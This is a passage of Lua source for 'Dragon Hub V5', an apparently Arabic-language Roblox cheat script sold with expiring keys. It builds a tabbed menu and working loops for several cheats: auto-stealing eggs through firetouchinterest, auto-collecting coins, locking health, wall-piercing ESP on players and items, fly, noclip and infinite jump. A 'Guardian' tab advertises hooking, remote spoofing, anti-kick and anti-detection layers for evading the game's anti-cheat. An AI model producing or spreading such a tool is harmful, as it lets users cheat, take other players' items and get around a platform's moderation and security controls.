    TBarI.Position = UDim2.new(0, 6, 0, 0)
    TBarI.BackgroundTransparency = 1
    TBarI.TextColor3 = Config.AccentColor
    TBarI.TextSize = 14
    TBarI.Font = Enum.Font.GothamBold

    local TBarL = Instance.new("TextLabel", TBar)
    TBarL.Text = "جاري التحقق..."
    TBarL.Size = UDim2.new(1, -90, 1, 0)
    TBarL.Position = UDim2.new(0, 34, 0, 0)
    TBarL.BackgroundTransparency = 1
    TBarL.TextColor3 = Color3.fromRGB(200, 200, 220)
    TBarL.Font = Enum.Font.GothamMedium
    TBarL.TextSize = 11
    TBarL.TextXAlignment = Enum.TextXAlignment.Left

    local KTL = Instance.new("TextLabel", TBar)
    KTL.Text = Config.KeyLabel
    KTL.Size = UDim2.new(0, 60, 0, 18)
    KTL.Position = UDim2.new(1, -66, 0.5, -9)
    KTL.BackgroundColor3 = Config.AccentColor
    KTL.TextColor3 = Color3.fromRGB(12, 12, 18)
    KTL.Font = Enum.Font.GothamBold
    KTL.TextSize = 10
    KTL.BorderSizePixel = 0
    Instance.new("UICorner", KTL).CornerRadius = UDim.new(1, 0)

    -- TAB BAR
    local TabBar = Instance.new("Frame", Main)
    TabBar.Size = UDim2.new(1, -16, 0, 44)
    TabBar.Position = UDim2.new(0, 8, 0, 126)
    TabBar.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
    TabBar.BorderSizePixel = 0
    Instance.new("UICorner", TabBar).CornerRadius = UDim.new(0, 8)

    local TSc = Instance.new("ScrollingFrame", TabBar)
    TSc.Size = UDim2.new(1, 0, 1, 0)
    TSc.BackgroundTransparency = 1
    TSc.BorderSizePixel = 0
    TSc.ScrollBarThickness = 0
    TSc.ScrollingDirection = Enum.ScrollingDirection.X
    TSc.CanvasSize = UDim2.new(0, 0, 0, 0)
    TSc.AutomaticCanvasSize = Enum.AutomaticSize.X

    local TLy = Instance.new("UIListLayout", TSc)
    TLy.FillDirection = Enum.FillDirection.Horizontal
    TLy.Padding = UDim.new(0, 4)
    TLy.SortOrder = Enum.SortOrder.LayoutOrder
    TLy.VerticalAlignment = Enum.VerticalAlignment.Center

    local TPad = Instance.new("UIPadding", TSc)
    TPad.PaddingLeft = UDim.new(0, 6)
    TPad.PaddingRight = UDim.new(0, 6)

    local Pages = Instance.new("Frame", Main)
    Pages.Size = UDim2.new(1, -16, 1, -180)
    Pages.Position = UDim2.new(0, 8, 0, 176)
    Pages.BackgroundTransparency = 1

    -- UI HELPERS
    local AP, AT = {}, {}

    local function NewPage(name)
        local p = Instance.new("ScrollingFrame", Pages)
        p.Name = name
        p.Size = UDim2.new(1, 0, 1, 0)
        p.BackgroundTransparency = 1
        p.BorderSizePixel = 0
        p.ScrollBarThickness = 3
        p.ScrollBarImageColor3 = Config.AccentColor
        p.CanvasSize = UDim2.new(0, 0, 0, 1200)
        p.AutomaticCanvasSize = Enum.AutomaticSize.Y
        p.Visible = false
        local pad = Instance.new("UIPadding", p)
        pad.PaddingRight = UDim.new(0, 8)
        pad.PaddingBottom = UDim.new(0, 10)
        local L = Instance.new("UIListLayout", p)
        L.Padding = UDim.new(0, 6)
        L.SortOrder = Enum.SortOrder.LayoutOrder
        AP[name] = p
        return p
    end

    local function NewTab(name, display, order)
        local b = Instance.new("TextButton", TSc)
        b.Name = name
        b.Size = UDim2.new(0, 76, 1, -10)
        b.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
        b.BorderSizePixel = 0
        b.Text = display
        b.TextColor3 = Color3.fromRGB(180, 180, 200)
        b.Font = Enum.Font.GothamMedium
        b.TextSize = 11
        b.LayoutOrder = order
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
        b.MouseButton1Click:Connect(function()
            for _, o in pairs(AT) do
                o.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
                o.TextColor3 = Color3.fromRGB(180, 180, 200)
            end
            b.BackgroundColor3 = Config.AccentColor
            b.TextColor3 = Color3.fromRGB(12, 12, 18)
            for n, p in pairs(AP) do p.Visible = (n == name) end
        end)
        AT[name] = b
        return b
    end

    local function Sec(p, t)
        local h = Instance.new("Frame", p)
        h.Size = UDim2.new(1, 0, 0, 24)
        h.BackgroundTransparency = 1
        local l = Instance.new("Frame", h)
        l.Size = UDim2.new(0, 3, 0, 14)
        l.Position = UDim2.new(0, 0, 0.5, -7)
        l.BackgroundColor3 = Config.AccentColor
        l.BorderSizePixel = 0
        Instance.new("UICorner", l).CornerRadius = UDim.new(1, 0)
        local lb = Instance.new("TextLabel", h)
        lb.Text = "  " .. t
        lb.Size = UDim2.new(1, -10, 1, 0)
        lb.Position = UDim2.new(0, 10, 0, 0)
        lb.BackgroundTransparency = 1
        lb.TextColor3 = Color3.fromRGB(220, 220, 235)
        lb.Font = Enum.Font.GothamBold
        lb.TextSize = 11
        lb.TextXAlignment = Enum.TextXAlignment.Left
    end

    local function Tog(p, t, d, cb)
        local f = Instance.new("Frame", p)
        f.Size = UDim2.new(1, 0, 0, 40)
        f.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
        f.BorderSizePixel = 0
        Instance.new("UICorner", f).CornerRadius = UDim.new(0, 7)
        local s = Instance.new("UIStroke", f)
        s.Color = Color3.fromRGB(40, 40, 54)
        s.Thickness = 1
        local lb = Instance.new("TextLabel", f)
        lb.Text = "   " .. t
        lb.Size = UDim2.new(1, -70, 1, 0)
        lb.BackgroundTransparency = 1
        lb.TextColor3 = Color3.fromRGB(215, 215, 230)
        lb.Font = Enum.Font.Gotham
        lb.TextSize = 12
        lb.TextXAlignment = Enum.TextXAlignment.Left
        local btn = Instance.new("TextButton", f)
        btn.Size = UDim2.new(0, 46, 0, 24)
        btn.Position = UDim2.new(1, -56, 0.5, -12)
        btn.BackgroundColor3 = d and Config.AccentColor or Color3.fromRGB(58, 58, 72)
        btn.Text = d and "ON" or "OFF"
        btn.TextColor3 = d and Color3.fromRGB(12,12,18) or Color3.fromRGB(255,255,255)
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 10
        btn.BorderSizePixel = 0
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)
        local st = d
        btn.MouseButton1Click:Connect(function()
            st = not st
            TweenService:Create(btn, TweenInfo.new(0.15), {
                BackgroundColor3 = st and Config.AccentColor or Color3.fromRGB(58, 58, 72)
            }):Play()
            btn.Text = st and "ON" or "OFF"
            btn.TextColor3 = st and Color3.fromRGB(12,12,18) or Color3.fromRGB(255,255,255)
            if cb then cb(st) end
            SaveConfig()
        end)
        return function() return st end
    end

    local function Btn(p, t, cb)
        local b = Instance.new("TextButton", p)
        b.Size = UDim2.new(1, 0, 0, 38)
        b.BackgroundColor3 = Color3.fromRGB(32, 32, 45)
        b.Text = t
        b.TextColor3 = Color3.fromRGB(230, 230, 240)
        b.Font = Enum.Font.GothamMedium
        b.TextSize = 12
        b.BorderSizePixel = 0
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 7)
        local s = Instance.new("UIStroke", b)
        s.Color = Color3.fromRGB(48, 48, 62)
        s.Thickness = 1
        b.MouseEnter:Connect(function()
            TweenService:Create(b, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(48, 48, 66)}):Play()
        end)
        b.MouseLeave:Connect(function()
            TweenService:Create(b, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(32, 32, 45)}):Play()
        end)
        b.MouseButton1Click:Connect(function() if cb then cb() end end)
    end

    local function Lbl(p, t, c)
        local l = Instance.new("TextLabel", p)
        l.Text = "   " .. t
        l.Size = UDim2.new(1, 0, 0, 20)
        l.BackgroundTransparency = 1
        l.TextColor3 = c or Color3.fromRGB(170, 170, 190)
        l.Font = Enum.Font.Gotham
        l.TextSize = 11
        l.TextXAlignment = Enum.TextXAlignment.Left
    end

    local function Inp(p, ph, cb)
        local tx = Instance.new("TextBox", p)
        tx.Size = UDim2.new(1, 0, 0, 38)
        tx.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
        tx.PlaceholderText = ph
        tx.Text = ""
        tx.TextColor3 = Color3.fromRGB(230, 230, 240)
        tx.PlaceholderColor3 = Color3.fromRGB(120, 120, 140)
        tx.Font = Enum.Font.Gotham
        tx.TextSize = 12
        tx.BorderSizePixel = 0
        Instance.new("UICorner", tx).CornerRadius = UDim.new(0, 7)
        local s = Instance.new("UIStroke", tx)
        s.Color = Color3.fromRGB(48, 48, 62)
        s.Thickness = 1
        tx.FocusLost:Connect(function() if cb then cb(tx.Text) end end)
    end

    -- PAGES
    local PHome = NewPage("Home")
    local PGuardian = NewPage("Guardian")
    local PProtect = NewPage("Protect")
    local PSteal = NewPage("Steal")
    local PHatch = NewPage("Hatch")
    local PChar = NewPage("Char")
    local PVisual = NewPage("Visual")
    local PFly = NewPage("Fly")
    local PMisc = NewPage("Misc")
    local PSet = NewPage("Set")

    NewTab("Home", "🏠", 1)
    NewTab("Guardian", "🛡️", 2)
    NewTab("Protect", "🔰", 3)
    NewTab("Steal", "🥚", 4)
    NewTab("Hatch", "🐣", 5)
    NewTab("Char", "👤", 6)
    NewTab("Visual", "👁️", 7)
    NewTab("Fly", "🕊️", 8)
    NewTab("Misc", "⚙️", 9)
    NewTab("Set", "🔧", 10)

    AT.Home.MouseButton1Click:Fire()

    -- HOME
    Sec(PHome, "🐉 DRAGON HUB V5 AURA")
    Lbl(PHome, "مرحباً " .. LocalPlayer.DisplayName, Color3.fromRGB(255, 220, 130))
    Lbl(PHome, "المفتاح: " .. tostring(Config.ActiveKey), Config.AccentColor)
    Lbl(PHome, "النوع: 👑 " .. Config.KeyLabel, Color3.fromRGB(255, 220, 130))
    Sec(PHome, "📊 LIVE STATS")
    Lbl(PHome, "الإصدار: V" .. VERSION)
    Lbl(PHome, "الحماية: 🛡️ 8 طبقات")
    Lbl(PHome, "🚫 إجراءات محجوبة: " .. tostring(Guardian.BlockedActions))
    Lbl(PHome, "💊 فحوصات صحة: " .. tostring(Guardian.HealthChecks))
    Lbl(PHome, "🥚 عمليات سرقة: " .. tostring(Config.StealCount))
    Sec(PHome, "⌨️ Keybinds")
    Lbl(PHome, "🐉 Floating Button")
    Lbl(PHome, "RShift — إخفاء/إظهار")
    Lbl(PHome, "RCtrl — Unload")
    Lbl(PHome, "Insert — فتح القائمة")

    -- GUARDIAN
    Sec(PGuardian, "🛡️ نظام الحماية المتقدم")
    Lbl(PGuardian, "8 طبقات حماية نشطة", Color3.fromRGB(100, 255, 150))
    Lbl(PGuardian, "1️⃣ Metamethod Hooking")
    Lbl(PGuardian, "2️⃣ Remote Event Spoofer")
    Lbl(PGuardian, "3️⃣ Anti-Detection")
    Lbl(PGuardian, "4️⃣ Behavior Humanizer AI")
    Lbl(PGuardian, "5️⃣ Health Integrity Monitor")
    Lbl(PGuardian, "6️⃣ Anti-Teleport Detection")
    Lbl(PGuardian, "7️⃣ Memory Protection")
    Lbl(PGuardian, "8️⃣ Silent Patch System")
    Sec(PGuardian, "⚙️ إعدادات Guardian")
    Tog(PGuardian, "تفعيل Guardian", true, function(v) Guardian.Enabled = v end)
    Tog(PGuardian, "🤖 Behavior AI", Config.BehaviorAI, function(v) Config.BehaviorAI = v end)
    Tog(PGuardian, "🔇 الوضع الصامت", Config.SilentMode, function(v) Config.SilentMode = v end)
    Tog(PGuardian, "🚫 منع الطرد التلقائي", Config.AntiKick, function(v) Config.AntiKick = v end)
    Btn(PGuardian, "🔍 عرض التقرير الكامل", function()
        local report = "Guardian Report:\n" ..
                       "Status: " .. (Guardian.Enabled and "Active" or "Off") ..
                       "\nHooks: " .. (Guardian.HooksActive and "Active" or "Off") ..
                       "\nBlocked Actions: " .. Guardian.BlockedActions ..
                       "\nHealth Checks: " .. Guardian.HealthChecks
        Notify("Guardian Report", report, 7, Color3.fromRGB(100, 200, 255))
    end)

    -- PROTECT
    Sec(PProtect, "🔰 الحماية الأساسية")
    Tog(PProtect, "🔒 قفل الصحة", Config.HealthLock, function(v) Config.HealthLock = v end)
    Tog(PProtect, "🎭 مضاد الرجدة", Config.AntiRagdoll, function(v) Config.AntiRagdoll = v end)
    Tog(PProtect, "🧲 مضاد الرمي", Config.AntiFling, function(v) Config.AntiFling = v end)
    Tog(PProtect, "🚫 مضاد اللمس", Config.AntiTouch, function(v) Config.AntiTouch = v end)
    Tog(PProtect, "🚨 الانتقال الطارئ", Config.EmergencyTP, function(v) Config.EmergencyTP = v end)
    Tog(PProtect, "🔄 استعادة الصحة", Config.AutoHeal, function(v) Config.AutoHeal = v end)
    Tog(PProtect, "🕳️ مضاد السقوط", Config.AntiVoid, function(v) Config.AntiVoid = v end)

    -- STEAL
    Sec(PSteal, "🥚 السرقة الذكية")
    Tog(PSteal, "🥚 السرقة التلقائية", Config.AutoSteal, function(v)
        Config.AutoSteal = v
        Notify("Auto Steal", v and "✓ مفعّل" or "معطّل")
    end)
    Tog(PSteal, "⏱️ تأخير ذكي", Config.SmartDelay, function(v) Config.SmartDelay = v end)
    Tog(PSteal, "🎯 سرقة كل البيض", Config.StealAll, function(v) Config.StealAll = v end)
    Tog(PSteal, "💎 البيض النادر فقط", Config.StealOnlyRare, function(v) Config.StealOnlyRare = v end)
    Tog(PSteal, "🏠 العودة للقاعدة", Config.TeleportOnSteal, function(v) Config.TeleportOnSteal = v end)

    -- HATCH
    Sec(PHatch, "🐣 الفتح التلقائي")
    Tog(PHatch, "تشغيل الفتح التلقائي", Config.AutoHatch, function(v) Config.AutoHatch = v end)
    Tog(PHatch, "🛒 شراء البيض", Config.AutoBuyEgg, function(v) Config.AutoBuyEgg = v end)
    Btn(PHatch, "🥚 فتح كل البيض الآن", function()
        local list = {"HatchEgg","hatchEgg","EggHatch","OpenEgg","hatch","Hatch","HatchAll"}
        for _, name in ipairs(list) do
            local r = ReplicatedStorage:FindFirstChild(name)
            if r then
                pcall(function()
                    if r:IsA("RemoteFunction") then r:InvokeServer()
                    else r:FireServer() end
                end)
                Notify("Hatch", "✓ " .. name)
                return
            end
        end
        Notify("Hatch", "✗ لم يتم العثور")
    end)

    -- CHAR
    Sec(PChar, "👤 الحركة")
    Tog(PChar, "🚀 سرعة معتدلة (32)", false, function(v) Config.WalkSpeed = v and 32 or 16 end)
    Tog(PChar, "🦘 قفز لا نهائي", Config.InfiniteJump, function(v) Config.InfiniteJump = v end)
    Tog(PChar, "🚪 Noclip", Config.Noclip, function(v) Config.Noclip = v end)
    Btn(PChar, "💀 إعادة إنعاش", function()
        if LocalPlayer.Character then LocalPlayer.Character:BreakJoints() end
    end)

    -- VISUAL
    Sec(PVisual, "👁️ ESP")
    Tog(PVisual, "👁️ رؤية البيض", Config.EggESP, function(v)
        Config.EggESP = v
        if not v then
            for _, o in ipairs(Workspace:GetDescendants()) do
                if o:IsA("Highlight") and o.Name == "DH5_Egg" then o:Destroy() end
            end
        end
    end)
    Tog(PVisual, "👤 رؤية اللاعبين", Config.PlayerESP, function(v)
        Config.PlayerESP = v
        if not v then
            for _, o in ipairs(Workspace:GetDescendants()) do
                if o:IsA("Highlight") and o.Name == "DH5_Player" then o:Destroy() end
            end
        end
    end)
    Tog(PVisual, "💰 رؤية العملات", Config.CoinESP, function(v)
        Config.CoinESP = v
        if not v then
            for _, o in ipairs(Workspace:GetDescendants()) do
                if o:IsA("Highlight") and o.Name == "DH5_Coin" then o:Destroy() end
            end
        end
    end)
    Sec(PVisual, "🌍 البيئة")
    Tog(PVisual, "☀️ إضاءة كاملة", Config.FullBright, function(v)
        Config.FullBright = v
        if v then
            Lighting.Ambient = Color3.fromRGB(255,255,255)
            Lighting.OutdoorAmbient = Color3.fromRGB(255,255,255)
            Lighting.Brightness = 2
        else
            Lighting.Ambient = Color3.fromRGB(70,70,70)
            Lighting.OutdoorAmbient = Color3.fromRGB(128,128,128)
            Lighting.Brightness = 1
        end
    end)
    Tog(PVisual, "🌫️ إزالة الضباب", Config.RemoveFog, function(v)
        Config.RemoveFog = v
        if v then
            Lighting.FogEnd = 100000
            Lighting.FogStart = 100000
        else
            Lighting.FogEnd = 1000
            Lighting.FogStart = 0
        end
    end)

    -- FLY
    Sec(PFly, "🕊️ الطيران")
    Tog(PFly, "تفعيل الطيران", Config.Fly, function(v)
        Config.Fly = v
        local char = LocalPlayer.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        if v then
            local bv = Instance.new("BodyVelocity", hrp)
            bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
            bv.Velocity = Vector3.zero
            Config.FlyBV = bv
            local bg = Instance.new("BodyGyro", hrp)
            bg.MaxTorque = Vector3.new(1e5, 1e5, 1e5)
            bg.P = 1e4
            Config.FlyBG = bg
            Notify("Fly", "✓ WASD + Space/Shift")
        else
            if Config.FlyBV then Config.FlyBV:Destroy(); Config.FlyBV = nil end
            if Config.FlyBG then Config.FlyBG:Destroy(); Config.FlyBG = nil end
            Notify("Fly", "معطّل")
        end
    end)

    -- MISC
    Sec(PMisc, "⚙️ متفرقات")
    Tog(PMisc, "🛡️ Anti-AFK", Config.AntiAFK, function(v) Config.AntiAFK = v end)
    Tog(PMisc, "💰 جمع العملات", Config.AutoCollectCoins, function(v) Config.AutoCollectCoins = v end)
    Btn(PMisc, "🔄 إعادة الاتصال", function()
        Notify("Rejoin", "جاري...")
        task.wait(1)
        pcall(function() TeleportService:Teleport(game.PlaceId, LocalPlayer) end)
    end)

    -- SETTINGS
    Sec(PSet, "🎨 الثيم")
    Btn(PSet, "🟡 ذهبي", function()
        Config.AccentColor = Color3.fromRGB(255, 180, 30)
        AL.BackgroundColor3 = Config.AccentColor
        HIcon.TextColor3 = Config.AccentColor
        Ttl.TextColor3 = Config.AccentColor
        KTL.BackgroundColor3 = Config.AccentColor
        Notify("Theme", "🟡 ذهبي", 2, Config.AccentColor)
    end)
    Btn(PSet, "🟣 بنفسجي", function()
        Config.AccentColor = Color3.fromRGB(140, 100, 255)
        AL.BackgroundColor3 = Config.AccentColor
        HIcon.TextColor3 = Config.AccentColor
        Ttl.TextColor3 = Config.AccentColor
        KTL.BackgroundColor3 = Config.AccentColor
        Notify("Theme", "🟣 بنفسجي", 2, Config.AccentColor)
    end)
    Btn(PSet, "🔴 أحمر", function()
        Config.AccentColor = Color3.fromRGB(240, 80, 90)
        AL.BackgroundColor3 = Config.AccentColor
        HIcon.TextColor3 = Config.AccentColor
        Ttl.TextColor3 = Config.AccentColor
        KTL.BackgroundColor3 = Config.AccentColor
        Notify("Theme", "🔴 أحمر", 2, Config.AccentColor)
    end)
    Btn(PSet, "🟢 أخضر", function()
        Config.AccentColor = Color3.fromRGB(70, 220, 130)
        AL.BackgroundColor3 = Config.AccentColor
        HIcon.TextColor3 = Config.AccentColor
        Ttl.TextColor3 = Config.AccentColor
        KTL.BackgroundColor3 = Config.AccentColor
        Notify("Theme", "🟢 أخضر", 2, Config.AccentColor)
    end)
    Btn(PSet, "🔵 أزرق", function()
        Config.AccentColor = Color3.fromRGB(80, 150, 255)
        AL.BackgroundColor3 = Config.AccentColor
        HIcon.TextColor3 = Config.AccentColor
        Ttl.TextColor3 = Config.AccentColor
        KTL.BackgroundColor3 = Config.AccentColor
        Notify("Theme", "🔵 أزرق", 2, Config.AccentColor)
    end)
    Sec(PSet, "⚙️ الإعدادات")
    Tog(PSet, "🔔 صوت الإشعارات", Config.NotifySound, function(v) Config.NotifySound = v end)
    Btn(PSet, "💾 حفظ الإعدادات", function()
        SaveConfig()
        Notify("Config", "✓ تم الحفظ")
    end)
    Sec(PSet, "🔑 المفتاح")
    Btn(PSet, "ℹ️ معلومات المفتاح", function()
        local r = Config.KeyExpireTime - os.time()
        Notify("Key", "المتبقي: " .. FormatTime(r), 5)
    end)
    Btn(PSet, "🚪 تسجيل الخروج", function()
        ClearKeyFile()
        Notify("Key", "✓ تم الحذف")
        task.wait(1)
        ScreenGui:Destroy()
    end)
    Btn(PSet, "❌ Unload Hub", function() ScreenGui:Destroy() end)

    -- DRAG
    local drD, drS, drP
    TB.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1
        or i.UserInputType == Enum.UserInputType.Touch then
            drD = true; drS = i.Position; drP = Main.Position
            i.Changed:Connect(function()
                if i.UserInputState == Enum.UserInputState.End then drD = false end
            end)
        end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if drD and (i.UserInputType == Enum.UserInputType.MouseMovement
        or i.UserInputType == Enum.UserInputType.Touch) then
            local d = i.Position - drS
            Main.Position = UDim2.new(drP.X.Scale, drP.X.Offset + d.X, drP.Y.Scale, drP.Y.Offset + d.Y)
        end
    end)

    -- OPEN/CLOSE AURA
    local isOpen = false
    local origSize = UDim2.new(0, 440, 0, 520)
    local function OpenUI()
        isOpen = true
        Main.Visible = true
        Main.Size = UDim2.new(0, 0, 0, 0)
        Main.Position = FB.Position
        Main.Rotation = 90
        TweenService:Create(Main, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            Size = origSize,
            Position = UDim2.new(0.5, -220, 0.5, -260),
            Rotation = 0
        }):Play()
        TweenService:Create(FB, TweenInfo.new(0.2), {Size = UDim2.new(0, 0, 0, 0)}):Play()
        task.wait(0.2)
        FB.Visible = false
    end
    local function CloseUI()
        isOpen = false
        TweenService:Create(Main, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
            Size = UDim2.new(0, 0, 0, 0),
            Position = FB.Position,
            Rotation = -90
        }):Play()
        task.wait(0.25)
        Main.Visible = false
        FB.Visible = true
        TweenService:Create(FB, TweenInfo.new(0.3, Enum.EasingStyle.Back), {Size = UDim2.new(0, 70, 0, 70)}):Play()
    end
    FB.MouseButton1Click:Connect(function()
        if moved then return end
        if not isOpen then OpenUI() end
    end)
    ClsB.MouseButton1Click:Connect(CloseUI)
    MinB.MouseButton1Click:Connect(function()
        if not isOpen then return end
        if Main.Size.Y.Offset > 100 then
            TweenService:Create(Main, TweenInfo.new(0.2), {Size = UDim2.new(0, 440, 0, 56)}):Play()
            MinB.Text = "+"
        else
            TweenService:Create(Main, TweenInfo.new(0.2), {Size = origSize}):Play()
            MinB.Text = "−"
        end
    end)

    -- TIMER LOOP
    task.spawn(function()
        while TBar and TBar.Parent do
            local r = Config.KeyExpireTime - os.time()
            if r <= 0 then
                TBarL.Text = "❌ انتهى المفتاح!"
                TBarL.TextColor3 = Color3.fromRGB(240, 80, 90)
                task.wait(3)
                ClearKeyFile()
                ScreenGui:Destroy()
                break
            else
                TBarL.Text = "المدة المتبقية: " .. FormatTime(r)
                if r < 300 then TBarL.TextColor3 = Color3.fromRGB(240, 80, 90)
                elseif r < 3600 then TBarL.TextColor3 = Color3.fromRGB(240, 180, 60)
                else TBarL.TextColor3 = Color3.fromRGB(200, 200, 220) end
            end
            task.wait(1)
        end
    end)

    -- CHARACTER ENGINE
    local function ApplyChar(c)
        local h = c:WaitForChild("Humanoid", 5)
        if h then
            h.WalkSpeed = Config.WalkSpeed
            h.JumpPower = Config.JumpPower
            h.UseJumpPower = true
        end
    end
    LocalPlayer.CharacterAdded:Connect(function(c) task.wait(0.5); ApplyChar(c) end)
    if LocalPlayer.Character then ApplyChar(LocalPlayer.Character) end

    RunService.RenderStepped:Connect(function()
        local c = LocalPlayer.Character
        if not c then return end
        local h = c:FindFirstChildOfClass("Humanoid")
        if h then
            h.WalkSpeed = Config.WalkSpeed
            h.JumpPower = Config.JumpPower
            if Config.AntiStun then h.PlatformStand = false end
            if Config.AntiRagdoll then
                h:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
                h:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
                if h:GetState() == Enum.HumanoidStateType.Ragdoll
                or h:GetState() == Enum.HumanoidStateType.FallingDown then
                    h:ChangeState(Enum.HumanoidStateType.Running)
                end
            end
        end
        if Config.Noclip then
            for _, p in ipairs(c:GetDescendants()) do
                if p:IsA("BasePart") and p.CanCollide then p.CanCollide = false end
            end
        end
    end)

    -- HEALTH LOCK + ANTI TOUCH + ANTI FLING + ANTI VOID
    task.spawn(function()
        while task.wait(0.15) do
            if not Config.HealthLock then continue end
            local c = LocalPlayer.Character
            if not c then continue end
            local h = c:FindFirstChildOfClass("Humanoid")
            if h and h.Health < h.MaxHealth then
                h.Health = h.MaxHealth
                Config.BlockedHits = Config.BlockedHits + 1
            end
        end
    end)

    task.spawn(function()
        while task.wait(0.3) do
            if not Config.AntiTouch then continue end
            local c = LocalPlayer.Character
            if not c then continue end
            for _, p in ipairs(c:GetDescendants()) do
                if p:IsA("BasePart") then p.CanTouch = false end
            end
        end
    end)

    task.spawn(function()
        while task.wait(0.1) do
            if not Config.AntiFling then continue end
            local c = LocalPlayer.Character
            if not c then continue end
            local hrp = c:FindFirstChild("HumanoidRootPart")
            if hrp and hrp.Velocity.Magnitude > 200 then
                hrp.Velocity = Vector3.zero
                hrp.RotVelocity = Vector3.zero
                Config.BlockedHits = Config.BlockedHits + 1
            end
        end
    end)

    RunService.Heartbeat:Connect(function()
        if not Config.AntiVoid then return end
        local c = LocalPlayer.Character
        if not c then return end
        local hrp = c:FindFirstChild("HumanoidRootPart")
        if hrp and hrp.Position.Y < -100 then
            hrp.CFrame = CFrame.new(0, 50, 0)
            Notify("Anti-Void", "تم إنقاذك!", 2, Color3.fromRGB(100, 200, 255))
        end
    end)

    -- ANTI AFK
    LocalPlayer.Idled:Connect(function()
        if not Config.AntiAFK then return end
        pcall(function()
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())
        end)
    end)

    -- INFINITE JUMP
    UserInputService.JumpRequest:Connect(function()
        if Config.InfiniteJump then
            local c = LocalPlayer.Character
            if c then
                local h = c:FindFirstChildOfClass("Humanoid")
                if h then h:ChangeState(Enum.HumanoidStateType.Jumping) end
            end
        end
    end)

    -- FLY LOOP
    RunService.RenderStepped:Connect(function()
        if not Config.Fly or not Config.FlyBV then return end
        local c = LocalPlayer.Character
        if not c then return end
        local cam = Workspace.CurrentCamera
        local dir = Vector3.zero
        if UserInputService:IsKeyDown(Enum.KeyCode.W) then dir = dir + cam.CFrame.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.S) then dir = dir - cam.CFrame.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.A) then dir = dir - cam.CFrame.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.D) then dir = dir + cam.CFrame.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.Space) then dir = dir + Vector3.new(0,1,0) end
        if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then dir = dir - Vector3.new(0,1,0) end
        Config.FlyBV.Velocity = dir * Config.FlySpeed
    end)

    -- AUTO STEAL
    task.spawn(function()
        while task.wait(Config.StealDelay) do
            if not Config.AutoSteal then continue end
            local c = LocalPlayer.Character
            if not c then continue end
            local hrp = c:FindFirstChild("HumanoidRootPart")
            if not hrp then continue end
            for _, o in ipairs(Workspace:GetDescendants()) do
                if o:IsA("BasePart") and o.Parent ~= c then
                    local nm = o.Name:lower()
                    if nm:find("egg") or nm:find("drop") then
                        if Config.StealOnlyRare then
                            if not (nm:find("rare") or nm:find("legendary") or nm:find("gold") or nm:find("mythic")) then
                                continue
                            end
                        end
                        if (o.Position - hrp.Position).Magnitude > Config.StealRange then continue end
                        pcall(function()
                            firetouchinterest(hrp, o, 0)
                            task.wait()
                            firetouchinterest(hrp, o, 1)
                        end)
                        Config.StealCount = Config.StealCount + 1
                        if not Config.StealAll then break end
                    end
                end
            end
            if Config.SmartDelay then
                task.wait(0.5 + math.random() * 0.7)
            end
        end
    end)

    -- AUTO COLLECT
    task.spawn(function()
        while task.wait(0.6) do
            if not Config.AutoCollectCoins then continue end
            local c = LocalPlayer.Character
            if not c then continue end
            local hrp = c:FindFirstChild("HumanoidRootPart")
            if not hrp then continue end
            for _, o in ipairs(Workspace:GetDescendants()) do
                if o:IsA("BasePart") then
                    local nm = o.Name:lower()
                    if nm:find("coin") or nm:find("cash") or nm:find("money") then
                        pcall(function()
                            firetouchinterest(hrp, o, 0)
                            task.wait()
                            firetouchinterest(hrp, o, 1)
                        end)
                        break
                    end
                end
            end
        end
    end)

    -- ESP LOOPS
    task.spawn(function()
        while task.wait(0.5) do
            if not Config.EggESP then
                for _, o in ipairs(Workspace:GetDescendants()) do
                    if o:IsA("Highlight") and o.Name == "DH5_Egg" then o:Destroy() end
                end
            else
                for _, o in ipairs(Workspace:GetDescendants()) do
                    if o:IsA("BasePart") and o.Parent ~= LocalPlayer.Character then
                        local nm = o.Name:lower()
                        if nm:find("egg") or nm:find("drop") then
                            if not o:FindFirstChild("DH5_Egg") then
                                local h = Instance.new("Highlight", o)
                                h.Name = "DH5_Egg"
                                h.FillColor = Config.EggESPColor
                                h.OutlineColor = Color3.fromRGB(255,255,255)
                                h.FillTransparency = 0.5
                                h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                            end
                        end
                    end
                end
            end
            if not Config.PlayerESP then
                for _, o in ipairs(Workspace:GetDescendants()) do
                    if o:IsA("Highlight") and o.Name == "DH5_Player" then o:Destroy() end
                end
            else
                for _, p in ipairs(Players:GetPlayers()) do
                    if p ~= LocalPlayer and p.Character then
                        if not p.Character:FindFirstChild("DH5_Player") then
                            local h = Instance.new("Highlight", p.Character)
                            h.Name = "DH5_Player"
                            h.FillColor = Config.PlayerESPColor
                            h.OutlineColor = Color3.fromRGB(255,255,255)
                            h.FillTransparency = 0.55
                            h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                        end
                    end
                end
            end
            if not Config.CoinESP then
                for _, o in ipairs(Workspace:GetDescendants()) do
                    if o:IsA("Highlight") and o.Name == "DH5_Coin" then o:Destroy() end
                end
            else
                for _, o in ipairs(Workspace:GetDescendants()) do
